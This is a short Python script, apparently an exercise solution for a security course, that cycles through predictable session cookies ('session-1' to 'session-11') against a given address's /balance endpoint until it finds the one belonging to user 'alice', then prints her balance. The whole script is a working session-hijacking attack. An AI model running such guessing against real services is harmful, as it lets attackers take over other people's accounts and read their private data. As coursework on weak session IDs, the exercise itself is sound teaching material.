import sys
import requests
import json


def test_session(address):
	# write your code here
	balance = 69
	for i in range(1, 12):
		response = requests.get(url=address + '/balance', cookies=dict(sessionid='session-' + str(i)))
		response_dict = json.loads(response.text)
		if (response_dict["username"] != "alice"): continue
		balance = json.loads(response.text)["balance"]
	return balance


def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
